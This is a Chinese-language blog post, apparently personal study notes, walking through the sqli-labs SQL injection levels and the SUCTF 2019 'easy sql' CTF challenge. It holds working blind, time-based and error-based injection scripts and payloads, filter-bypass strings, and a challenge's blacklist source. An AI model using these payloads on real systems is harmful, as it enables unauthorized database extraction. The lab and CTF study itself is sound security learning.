<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>sql | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="#基础部分的题 #num_1~4#均为闭合方式不同#Num_1select * from users where id &#x3D; ‘ ‘#Num_2select * from users where id &#x3D;#Num_3select * from users where id &#x3D;(‘ ‘)#Num_4select * form users where id &#x3D;(“ “)  #Num_5,6##类似于盲注">
<meta property="og:type" content="article">
<meta property="og:title" content="sql">
<meta property="og:url" content="http://example.com/2021/07/11/sql/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="#基础部分的题 #num_1~4#均为闭合方式不同#Num_1select * from users where id &#x3D; ‘ ‘#Num_2select * from users where id &#x3D;#Num_3select * from users where id &#x3D;(‘ ‘)#Num_4select * form users where id &#x3D;(“ “)  #Num_5,6##类似于盲注">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-07-11T13:53:56.000Z">
<meta property="article:modified_time" content="2021-07-11T13:55:00.283Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/11/sql/" class="article-date">
  <time class="dt-published" datetime="2021-07-11T13:53:56.000Z" itemprop="datePublished">2021-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      sql
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>#基础部分的题</p>
<p>#num_1~4<br>#均为闭合方式不同<br>#Num_1<br>select * from users where id = ‘ ‘<br>#Num_2<br>select * from users where id =<br>#Num_3<br>select * from users where id =(‘ ‘)<br>#Num_4<br>select * form users where id =(“ “)</p>
<hr>
<p>#Num_5,6<br>##类似于盲注<br>##写了个脚本,爆库<br>    url = ‘<a target="_blank" rel="noopener" href="http://www.sqlzhuru.com/Less-5/&#39;">http://www.sqlzhuru.com/Less-5/&#39;</a><br>    table=””<br>    for j in range(1,10):<br>        for i in range(48,122):<br>            q =”?id=1’ and ascii(substr(database(),{},1))={}%23”.format(j,i)<br>            r = requests.get(url=url+q)<br>            if “You are in………..” in r.text:<br>                table = table + chr(i)</p>
<pre><code>print(table)
</code></pre>
<p>##爆表<br>def get_table():<br>    table = “”<br>    for k in range(0,4):<br>        for i in range(1,10):<br>            for j in range(48,122):<br>                q = “?id=1’ and (select ascii(substr((select table_name from information_schema.tables where table_schema = ‘security’ limit {},1),{},1))={})%23”.format(k,i,j)<br>                r = requests.get(url=url+q)<br>                if “You are in………..” in r.text:<br>                    table = table + chr(j)</p>
<pre><code>return table
</code></pre>
<p>##爆字段(只爆了users)<br>    def get_column():<br>        column = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and (select ascii(substr((select column_name from information_schema.columns where table_name = ‘users’ limit {},1),{},1))={})%23”.format(k, i, j)<br>                    r = requests.get(url=url+q)<br>                    if “You are in………..” in r.text:<br>                        column = column + chr(j)</p>
<pre><code>    return column
</code></pre>
<p>#Num_7绕过闭合方式+盲注即可,但是本关卡宗旨在于利用文件写入然后利用webshell</p>
<p>#Num_8同Num5,盲注,但是报错不能用,可以用sleep或者布尔</p>
<p>#Num_9<br>##与8关和5关在于,报错和回显都没了,只能用延时注入<br>##延时脚本<br>##爆库<br>    def get_database_sleep():<br>        database = “”<br>        for i in range(1, 10):<br>            for j in range(48, 122):<br>                q = “?id=1’ and if(ascii(mid(database(),{},1))={},sleep(3),1)–+”.format(i, j)<br>                r = requests.get(url=url + q)<br>                if r.elapsed.total_seconds()&gt;1:<br>                    database = database + chr(j)<br>        return database<br>##爆表<br>    def get_table_sleep():<br>        table = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and if(ascii(mid((select table_name from information_schema.tables where table_schema=’security’ limit {},1),{},1))={},sleep(2),1)%23”.format(k,i,j)<br>                    r = requests.get(url=url+q)<br>                    if r.elapsed.total_seconds()&gt;1:<br>                        table = table + chr(j)<br>                        print(table)<br>        return table<br>##爆列<br>    def get_table_sleep():<br>        column = “”<br>        for k in range(0,4):<br>            for i in range(1,10):<br>                for j in range(48,122):<br>                    q = “?id=1’ and if(ascii(mid((select column_name from information_schema.columns where table_name=’users’ limit {},1),{},1))={},sleep(2),1)%23”.format(k,i,j)<br>                    r = requests.get(url=url+q)<br>                    if r.elapsed.total_seconds()&gt;1:<br>                        column = column + chr(j)<br>                        print(column)<br>        return column<br>#Num_10同9,闭合方式由<br>select * from users where id = ‘ ‘变成id = “ “</p>
<p>#Num_11<br>##同1~5,只不过由GET转为POST</p>
<p>#Num12同11<br>##闭合方式由<br>    where username = ‘ ‘变成 username = (“ “)</p>
<p>#Num_13<br>##同Num_5,无回显,可用报错,或者延时<br>##爆库<br>    extractvalue(1,concat(0x7e,(select database()),0x7e))%23<br>##爆表<br>    extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23<br>##爆字段<br>    extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’),0x7e))%23<br>#Num_14<br>##同上,闭合方式更换了<br>    username = ‘ ‘变成 username = “ “</p>
<p>#Num_15<br>##同9,报错信息和回显均无,利用延时即可,举个例子<br>    uname=admin&amp;passwd=admin’  and if(substr(database(),1,1)=’s’,sleep(2),1)%23&amp;submit=Submit</p>
<p>#Num_16<br>##同上,闭合方式由<br>    username = ‘’更换为username = (“ “)</p>
<p>#Num_17<br>##update型,没办法用普通的注入,只能报错,做法同13<br>##爆库<br>    admin’ or (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    ))%23<br>##后面类似</p>
<p>#Num_18<br>##看到回显位是Ua字段,肯定得抓包从UA字段下手<br>##insert型报错注入<br>     ‘ and (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    )) and ‘<br>##注意闭合两边,不大理解的就是  在最后那为啥得加个and,不加and就不行</p>
<p>#Num_19<br>##同Num_18,注入字段从Ua换成了  referer</p>
<p>#Num_20<br>##同Num_18,注入字段从Ua换成了 Cookie,只不过闭合方式换了一下<br>##payload,爆库,后面类似:<br>    admin’ and (extractvalue(1,concat(0x7e,(select database()  ),0x7e)    ))%23</p>
<p>#Num_21<br>##同上,  只不过加了个base64编码而已,并且闭合方式变了一下<br>##爆库,后面差不多<br>    YWRtaW4nKSAgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkgICksMHg3ZSkgICAgKSkj</p>
<p>#中级题</p>
<p>#Num_23<br>##瞅了半天,啥也没提示,最后无奈看了源码,发现过滤了注释符。。。<br>##直接绕过,然后跟第一题就没差别了<br>##爆库，后面就不写了,没差别<br>    ?id=1’ and 1=0 union select 1,database(),3 and ‘</p>
<p>#Num_24二次注入(不是特别理解)</p>
<p>#Num_25<br>##看页面提示, and和or给吃了,输出一下$sql(查询代码)<br>    1’ and %23<br>    SELECT * FROM users WHERE id=’1’ #’ LIMIT 0,1<br>##发现果然没了<br>##多种思路绕过,双写,异或,大小写变形,利用&amp;&amp;和||符号也可,payload:<br>    1’ aandnd 1=2%23<br>    1’ ^ 1%23<br>##建议双写,异或还得配合布尔,更麻烦,后边就不说了,碰到or 或者and的双写下即可</p>
<p>#Num_25_a<br>##同上,完全没差别</p>
<p>#Num_26<br>##看提示,空格给吞了,官方给的wp是说Windows不顶用,得换linux,咕了这题</p>
<p>#Num_27<br>##union 和 select 全没了<br>##瞧瞧过滤函数<br>    function blacklist($id)<br>    {<br>    $id= preg_replace(‘/[/*]/‘,””, $id);        //strip out /*<br>    $id= preg_replace(‘/[–]/‘,””, $id);        //Strip out –.<br>    $id= preg_replace(‘/[#]/‘,””, $id);            //Strip out #.<br>    $id= preg_replace(‘/[ +]/‘,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/select/m’,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/[ +]/‘,””, $id);        //Strip out spaces.<br>    $id= preg_replace(‘/union/s’,””, $id);        //Strip out union<br>    $id= preg_replace(‘/select/s’,””, $id);        //Strip out select<br>    $id= preg_replace(‘/UNION/s’,””, $id);        //Strip out UNION<br>    $id= preg_replace(‘/SELECT/s’,””, $id);        //Strip out SELECT<br>    $id= preg_replace(‘/Union/s’,””, $id);        //Strip out Union<br>    $id= preg_replace(‘/Select/s’,””, $id);        //Strip out select<br>    return $id;<br>    }<br>##就假设自己绕过了空格,注释,or,and<br>##这题跟前一题差在union,select<br>##思路一:双写绕过</p>
<p>#Num_27a<br>##同上,所有的a只是把报错信息关了而已,不用报错注入即可</p>
<p>#Num_28<br>##多试几次,只是过滤了union 和select一起用的时候,单用select还是可以的<br>##突破口:布尔即可</p>
<p>###SUCTF 2019 easy sql<br>    &lt;?php<br>        session_start();</p>
<pre><code>    include_once &quot;config.php&quot;;
    
    $post = array();
    $get = array();
    global $MysqlLink;
    
    //GetPara();
    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
    if(!$MysqlLink)&#123;
        die(&quot;Mysql Connect Error!&quot;);
    &#125;
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB)&#123;
        die(&quot;Choose Database Error!&quot;);
    &#125;
    
    foreach ($_POST as $k=&gt;$v)&#123;
        if(!empty($v)&amp;&amp;is_string($v))&#123;
            $post[$k] = trim(addslashes($v));
        &#125;
    &#125;
    foreach ($_GET as $k=&gt;$v)&#123;
        if(!empty($v)&amp;&amp;is_string($v))&#123;
            $get[$k] = trim(addslashes($v));
        &#125;
    &#125;
    //die();
    ?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php
    
    if(isset($post[&#39;query&#39;]))&#123;
        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]));
        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]))&#123;
            //echo $post[&#39;query&#39;];
            die(&quot;Nonono.&quot;);
        &#125;
        if(strlen($post[&#39;query&#39;])&gt;40)&#123;
            die(&quot;Too long.&quot;);
        &#125;
        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;　　　　 //sql执行语句
        mysqli_multi_query($MysqlLink,$sql);
        do&#123;
            if($res = mysqli_store_result($MysqlLink))&#123;
                while($row = mysqli_fetch_row($res))&#123;
                    print_r($row);
                &#125;
            &#125;
        &#125;while(@mysqli_next_result($MysqlLink));
        
    &#125;
    
?&gt;
</code></pre>
<p>###源码是网上给找的(做完题后找)<br>###一开始手工注入一下,发现有过滤东西,or给过滤了,不知道还过滤了啥,先fuzz一套,看看过滤了啥,爆破一下,发现正常手工能用的函数都给ban了,没招,只能找资料了(学习一些新姿势除了堆叠)<br>###sql_mode规则的设置<br>    当 sql_mode 设置了  PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>    当 sql_mode 没有设置  PIPES_AS_CONCAT 时 (默认没有设置)，|| 就是逻辑或，相当于OR函数<br>###堆叠注入下,利用;可执行多语句,设置sql_ mode=PIPES_AS_CONCAT,使得||符号作为连接符,同时执行,这样再导入1;sql_mode=PIPES_AS_CONCAT,使得查询语句变为<br>    select 1;ssql_mode=PIPES_AS_CONCAT || flag from flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/11/sql/" data-id="ckqz9dyaq0000koc69zsievy3" data-title="sql" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2021/07/11/RCE/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">RCE</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/11/sql/">sql</a>
          </li>
        
          <li>
            <a href="/2021/07/11/RCE/">RCE</a>
          </li>
        
          <li>
            <a href="/2021/07/11/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>